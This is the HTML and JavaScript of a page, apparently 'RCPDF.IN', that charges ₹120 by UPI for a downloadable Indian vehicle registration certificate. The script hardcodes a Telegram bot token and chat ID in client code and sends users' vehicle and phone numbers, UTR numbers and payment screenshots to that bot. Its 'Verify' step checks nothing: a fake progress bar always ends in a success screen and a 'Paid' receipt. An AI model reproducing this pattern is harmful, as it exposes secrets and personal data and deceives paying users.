<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RCPDF.IN - All Services</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --primary: #ff0066; --ind-blue: #003399; }
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Arial', sans-serif; }
        
        body { 
            background: linear-gradient(180deg, #FF9933 0%, #ffffff 40%, #ffffff 60%, #138808 100%); 
            background-attachment: fixed; color: #000; overflow-x: hidden; min-height: 100vh; 
        }

        .header { position: fixed; top: 0; width: 100%; background: #fff; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; z-index: 1000; height: 60px; border-bottom: 3px solid var(--ind-blue); }
        .logo { color: var(--ind-blue); font-weight: 900; font-size: 22px; text-decoration: none; position: absolute; left: 50%; transform: translateX(-50%); }
        
        .card { margin: 100px auto 20px; width: 92%; max-width: 420px; background: rgba(255, 255, 255, 0.98); padding: 30px 20px; border-radius: 25px; text-align: center; border: 2px solid var(--ind-blue); box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
        
        .hsrp-plate { background: #fff; width: 100%; height: 80px; border: 2px solid #000; border-radius: 12px; display: flex; align-items: center; overflow: hidden; margin-bottom: 15px; position: relative; }
        .ind-strip { background: var(--ind-blue); width: 65px; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; position: absolute; left: 0; }
        .ind-strip img { width: 30px; margin-bottom: 4px; }
        
        #vehInput { flex: 1; border: none; height: 100%; font-size: 26px; font-weight: 900; text-align: center; outline: none; text-transform: uppercase; width: 100%; padding-left: 70px; }
        #mob, #fatherName, #utr { width: 100%; padding: 18px; border-radius: 12px; border: 2px solid #ddd; margin-bottom: 15px; font-size: 18px; text-align: center; font-weight: bold; outline: none; }
        #utr:focus { border-color: var(--ind-blue); }

        .promo-container { margin-bottom: 15px; background: #eef2ff; padding: 12px; border-radius: 12px; border: 1.5px dashed var(--ind-blue); display: flex; justify-content: space-between; align-items: center; }
        .promo-apply-btn { background: var(--ind-blue); color: #fff; border: none; padding: 8px 15px; border-radius: 8px; cursor: pointer; font-weight: bold; }
        .promo-apply-btn.remove { background: #ff0000; }
        
        .neon-btn { position: relative; background: #000; color: #fff; font-size: 16px; font-weight: 900; padding: 18px; width: 100%; border-radius: 15px; border: none; cursor: pointer; text-transform: uppercase; margin-bottom: 25px; overflow: hidden; display: flex; align-items: center; justify-content: center; }
        .neon-btn::after { content: 'PAY WITH UPI ❤️'; position: absolute; inset: 4px; background: #000; border-radius: 12px; display: flex; align-items: center; justify-content: center; z-index: 1; }
        
        .btn { width: 100%; padding: 18px; border-radius: 12px; border: none; background: var(--ind-blue); color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; }
        
        .loader-wrap { position: fixed; inset: 0; background: #000; z-index: 5000; display: none; flex-direction: column; justify-content: center; align-items: center; color: #fff; }
        .road { width: 85%; height: 4px; background: #333; position: relative; margin-top: 20px; }
        .car { font-size: 45px; position: absolute; bottom: 0; left: 0; transform: scaleX(-1); }
        .pct { font-size: 45px; font-weight: 900; color: #ff0066; }
        
        .overlay { position: fixed; inset: 0; z-index: 9999; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; color: #fff; background: rgba(0, 128, 0, 0.98); }
    </style>
</head>
<body>

<div class="header">
    <b class="logo">RCPDF.IN</b>
    <button style="background:none; border:none; font-size:24px; cursor:pointer;" onclick="location.reload()">🏠</button>
</div>

<div id="successOverlay" class="overlay">
    <h1 style="font-size: 60px;">😊</h1>
    <h1>Congratulations!</h1>
    <p>Aapka REQUEST bhej diya gaya hai.</p>
</div>

<div class="card">
    <div id="p1">
        <h2 style="margin-bottom:15px; color: var(--ind-blue);">Download Digital RC</h2>
        <div class="hsrp-plate">
            <div class="ind-strip">
                <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Flag_of_India.svg">
                <span>IND</span>
            </div>
            <input type="text" id="vehInput" placeholder="BR-09-AB-1234" maxlength="13" oninput="formatV(this)">
        </div>
        <button class="btn" onclick="go2()">CONTINUE</button>
    </div>

    <div id="p2" style="display:none;">
        <div id="promo-msg" style="display:none; color: green; font-weight: bold; margin-bottom: 10px;"></div>
        
        <button class="neon-btn" onclick="pay()"></button>

        <div style="background:#fff; padding:10px; border-radius:15px; display:inline-block; margin-bottom:15px; border:1px solid #ddd;">
            <img id="qr" src="" width="160">
            <p id="amtLabel" style="font-size:10px; font-weight:bold; margin-top:5px;">SCAN QR TO PAY ₹120</p>
        </div>

        <div class="promo-container">
            <div class="promo-text" style="text-align: left;">
                <small style="display:block; font-size:10px;">Available Offer:</small>
                <b id="promoLabel">WELCOME10</b>
            </div>
            <button id="applyBtn" class="promo-apply-btn" onclick="handlePromo()">APPLY</button>
        </div>

        <input type="tel" id="mob" placeholder="WhatsApp Number" maxlength="10">
        <input type="text" id="fatherName" placeholder="Father's Name (Optional)">
        
        <input type="text" id="utr" placeholder="Enter 12-Digit UTR Number" maxlength="12" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
        <p style="margin: 5px 0 10px; font-size: 12px; font-weight: bold; color: #666;">-- OR UPLOAD SCREENSHOT --</p>

        <div style="border: 2px dashed #bbb; padding: 15px; border-radius: 12px; margin-bottom: 20px; background: #f9f9f9;">
            <input type="file" id="ss" accept="image/*" style="width:100%;">
        </div>

        <button class="btn" onclick="submitData()">Verify & Download PDF</button>
    </div>
</div>

<div class="loader-wrap" id="load">
    <div class="road"><div class="car" id="carIcon">🚗</div></div>
    <div class="pct" id="pText">0%</div>
    <p>🔄 Processing (Do not Refresh)...</p>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>

<script>
    const T_TOKEN = "8138238341:AAGi4LxV7247hUvs_HoGLSKRhkcEapMCSuA";
    const T_CHAT_ID = "5600045707";
    let currentAmount = 120.00;
    let promoUsed = "NONE";

    function formatV(i) {
        let v = i.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
        let out = "";
        if (v.length > 0) out += v.substring(0, 2);
        if (v.length > 2) out += "-" + v.substring(2, 4);
        if (v.length > 4) out += "-" + v.substring(4, 6);
        if (v.length > 6) out += "-" + v.substring(6, 10);
        i.value = out;
    }

    function updateQR(amt) {
        const upi = `upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=${amt.toFixed(2)}&cu=INR&tn=RC%20DOWNLOAD`;
        document.getElementById('qr').src = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" + encodeURIComponent(upi);
    }

    function go2() {
        if(document.getElementById('vehInput').value.length < 9) { alert("Invalid Vehicle Number!"); return; }
        updateQR(currentAmount);
        document.getElementById('p1').style.display='none';
        document.getElementById('p2').style.display='block';
    }

    function handlePromo() {
        const btn = document.getElementById('applyBtn');
        const msg = document.getElementById('promo-msg');
        if (promoUsed === "NONE") {
            currentAmount = 108.00;
            promoUsed = "WELCOME10";
            btn.innerText = "REMOVE";
            btn.classList.add('remove');
            msg.innerText = "Hurray! 🎉 WELCOME10 Applied (10% Off)";
            msg.style.display = "block";
        } else {
            currentAmount = 120.00;
            promoUsed = "NONE";
            btn.innerText = "APPLY";
            btn.classList.remove('remove');
            msg.style.display = "none";
        }
        document.getElementById('amtLabel').innerText = `SCAN QR TO PAY ₹${currentAmount}`;
        updateQR(currentAmount);
    }

    function pay() {
        window.location.href = `upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=${currentAmount.toFixed(2)}&cu=INR&tn=RC%20DOWNLOAD`;
    }

    async function submitData() {
        const mob = document.getElementById('mob').value;
        const utr = document.getElementById('utr').value;
        const ss = document.getElementById('ss').files[0];

        if (mob.length < 10) { alert("Mobile number sahi daalein!"); return; }
        if (!utr && !ss) { alert("Ya toh 12-digit UTR daalein ya Payment Screenshot upload karein!"); return; }
        if (utr && utr.length !== 12) { alert("UTR Number 12 digits ka hona chahiye!"); return; }

        document.getElementById('load').style.display='flex';
        let p = 0;
        let iv = setInterval(async () => {
            p += 5;
            document.getElementById('pText').innerText = p + "%";
            document.getElementById('carIcon').style.left = (p * 0.85) + "%";

            if (p === 60) {
                const now = new Date();
                const txId = "RC" + Math.floor(Math.random() * 9000000000);
                const d = now.toLocaleDateString('en-IN');
                const t = now.toLocaleTimeString('en-IN');
                
                const pdfBlob = makePDF(d, t, txId, utr);

                if (utr) {
                    await sendTDoc(pdfBlob, txId, utr);
                } else {
                    await sendTPhoto(ss, txId);
                }
            }

            if (p >= 100) {
                clearInterval(iv);
                document.getElementById('load').style.display='none';
                document.getElementById('successOverlay').style.display='flex';
                setTimeout(() => location.reload(), 4000);
            }
        }, 100);
    }

    async function sendTDoc(blob, tx, utr) {
        let fd = new FormData();
        fd.append("chat_id", T_CHAT_ID);
        fd.append("document", blob, `Receipt_${tx}.pdf`);
        fd.append("caption", `📄 *NEW RC ORDER (UTR)*\n\n🔢 *UTR:* \`${utr}\`\n🚗 *Veh:* ${document.getElementById('vehInput').value}\n📱 *Mob:* ${document.getElementById('mob').value}\n💰 *Paid:* ₹${currentAmount}`);
        fd.append("parse_mode", "Markdown");
        await fetch(`https://api.telegram.org/bot${T_TOKEN}/sendDocument`, { method: "POST", body: fd });
    }

    async function sendTPhoto(file, tx) {
        let fd = new FormData();
        fd.append("chat_id", T_CHAT_ID);
        fd.append("photo", file);
        fd.append("caption", `🚀 *NEW RC ORDER (PHOTO)*\n\n🆔 *ID:* \`${tx}\`\n🚗 *Veh:* ${document.getElementById('vehInput').value}\n📱 *Mob:* ${document.getElementById('mob').value}\n💰 *Paid:* ₹${currentAmount}`);
        fd.append("parse_mode", "Markdown");
        await fetch(`https://api.telegram.org/bot${T_TOKEN}/sendPhoto`, { method: "POST", body: fd });
    }

    function makePDF(d, t, tx, utr) {
        const { jsPDF } = window.jspdf;
        const doc = new jsPDF();
        doc.setFillColor(0, 51, 153);
        doc.rect(5, 5, 200, 30, 'F');
        doc.setTextColor(255);
        doc.setFontSize(22);
        doc.text("RCPDF.IN - PAYMENT RECEIPT", 105, 25, null, null, "center");
        
        doc.setTextColor(0);
        doc.setFontSize(12);
        let y = 50;
        const data = [
            ["ORDER ID:", tx],
            ["UTR NUMBER:", utr || "UPLOADED VIA IMAGE"],
            ["DATE:", d],
            ["VEHICLE NO:", document.getElementById('vehInput').value],
            ["WHATSAPP NO:", document.getElementById('mob').value],
            ["AMOUNT PAID:", "INR " + currentAmount.toFixed(2)]
        ];

        data.forEach(row => {
            doc.rect(15, y, 180, 10);
            doc.text(row[0], 20, y + 7);
            doc.text(row[1], 85, y + 7);
            y += 10;
        });

        doc.setFontSize(10);
        doc.text("Note: Digital copy will be sent on WhatsApp within 60 mins.", 105, y + 20, null, null, "center");
        
        doc.save(`Receipt_${tx}.pdf`);
        return doc.output('blob');
    }
</script>

</body>
</html>
